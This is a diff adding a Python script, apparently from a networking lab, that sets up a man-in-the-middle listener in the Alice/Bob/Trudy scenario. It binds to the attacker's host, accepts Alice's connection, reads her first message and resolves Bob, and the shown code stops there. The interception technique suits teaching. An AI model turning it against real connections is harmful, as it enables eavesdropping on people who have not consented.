@@ -1,0 +1,44 @@
+import socket
+import sys
+import ssl
+
+def man_in_the_middle(host1, host2):
+    port = 5006
+
+    # Create a socket to intercept communication
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print('Socket created')
+    except socket.error as e:
+        print(f'Error creating socket: {e}')
+        sys.exit()
+
+    # Resolve hostname of the attacker (Trudy)
+    try:
+        my_ip = socket.gethostbyname("trudy1")
+    except socket.gaierror:
+        print('Could not resolve hostname for Trudy')
+        sys.exit()
+
+    # Bind the socket to the attacker's IP and port
+    try:
+        s.bind((my_ip, port))
+    except socket.error as e:
+        print(f'Bind failed. Error: {e}')
+        sys.exit()
+
+    # Start listening for incoming connections
+    s.listen(1)
+    print('Socket now listening')
+
+    # Accept connection from Alice
+    conn, addr = s.accept()
+    print(f'Connection established with Alice: {addr}')
+    data = conn.recv(50)  # Receive initial message from Alice
+
+    # Resolve hostname of Bob
+    try:
+        remote_ip_bob = socket.gethostbyname(host2)
+    except socket.gaierror:
+        print('Could not resolve hostname for Bob')
+        sys.exit()
